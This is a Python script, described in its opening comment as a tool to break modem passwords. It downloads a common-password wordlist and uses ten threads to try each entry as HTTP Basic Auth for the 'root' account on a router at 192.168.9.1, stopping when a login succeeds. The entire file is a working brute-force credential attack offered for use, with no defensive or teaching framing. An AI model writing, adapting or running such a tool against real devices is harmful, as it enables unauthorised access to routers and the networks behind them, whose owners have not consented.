# This is a program used to break modem passwords from stupid ISP's
import os
import requests
import base64
import threading

from itertools import product
from string import ascii_letters

from requests.adapters import HTTPAdapter
from urllib3 import Retry

import curses
screen = curses.initscr()
curses.noecho()
curses.curs_set(0)
curses.nonl()

# Generate the letters to be used
letters = ''

adapter = HTTPAdapter(max_retries=Retry(
    total=3,
    status_forcelist=[429, 500, 502, 503, 504, 401],
    method_whitelist=["HEAD", "GET", "OPTIONS"]
))
http = requests.Session()
http.mount("https://", adapter)
http.mount("http://", adapter)

for asx in range(33, 126):
    letters += chr(asx)


def println(y, x, string):
    # screen.erase()
    curses.setsyx(y, x)
    screen.clrtoeol()
    screen.addstr(y, x, string)
    screen.refresh()
    

def get_password_list():
    params = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'
    }

    r = http.get(
        'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt',
        headers=params)
    pwf = open('passwords.dic', 'a')

    pwf.write(r.text)
    println(1, 0, '{} {}'.format("Password-Get-Thread-1", "Got Passwords"))

    pwf.close()


def create_dictionary(max_length):
    try:
        pwf = open('passwords.dic', 'a')
        counter = 0

        for i in range(1, max_length):
            passwords = map(''.join, product(ascii_letters, repeat=i))

            for pswd in passwords:
                percent = float(counter / len(passwords) * 100)

                pwf.write(str(pswd) + "\r\n")
                println(1, 0, '{} {} | {:.2f}%'.format("Password-Gen-Thread-1", pswd, percent))

                counter += 1

        pwf.close()
    except:
        pass


def read_password_dictionary():
    pwf = open('passwords.dic', 'r')
    passwords = pwf.readlines()
    pwf.close()
    return passwords


def brute_thread(thread_idx, thread_name, passwords):
    URL = "http://192.168.9.1/"  # The router end point

    status_code = 0

    for idx, password in enumerate(passwords):
        try:
            user_pass = "root:" + password.replace('\n', '')
            user_pass_bytes = user_pass.encode('ascii')

            auth_key_bytes = base64.b64encode(user_pass_bytes)
            auth_key = auth_key_bytes.decode('ascii')

            params = {'Authorization': 'Basic ' + auth_key,
                      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'}

            percent = float(idx) / len(passwords) * 100

            println(thread_idx, 0, '{} | {:.2f}%'.format(thread_name, percent))

            r = requests.get(URL, headers=params)

            status_code = r.status_code

            if status_code == 404:
                raise(Exception("404 Error jackass"))
            elif status_code == 401:
                continue
            elif status_code == 200:
                println(thread_idx, 0, "{}: Password is: {}".format(thread_name, password))
                exit(1)

        except Exception as e:
            println(11, 0, "Error with password: {} : {} Reason {} ".format(password, str(status_code), str(e)))
            pass

    println(thread_idx, 0, "{}: Password not found!".format(thread_name))


def main():
    screen.clear()

    if not os.path.exists('passwords.dic'):
        println(1, 0, "Getting a dictionary to use")
        # create_dictionary(8)
        get_password_list()

    passwords = read_password_dictionary()

    threads = list()

    max_threads = 10
    passwords_split_cnt = int(len(passwords) / max_threads)

    password_chunks = [passwords[x:x + passwords_split_cnt] for x in range(0, len(passwords), passwords_split_cnt)]

    println(1, 0, "Starting brute threads...")
    for i in range(1, max_threads):
        thread = threading.Thread(target=brute_thread, args=(i, "Thread-{}".format(str(i)), password_chunks[i]))
        threads.append(thread)
        println(i, 0, "Starting Thread-{} of {}".format(str(i), str(max_threads)))
        thread.start()
        println(i, 0, "Thread-{} started successfully".format(str(i)))


if __name__ == '__main__':
    main()
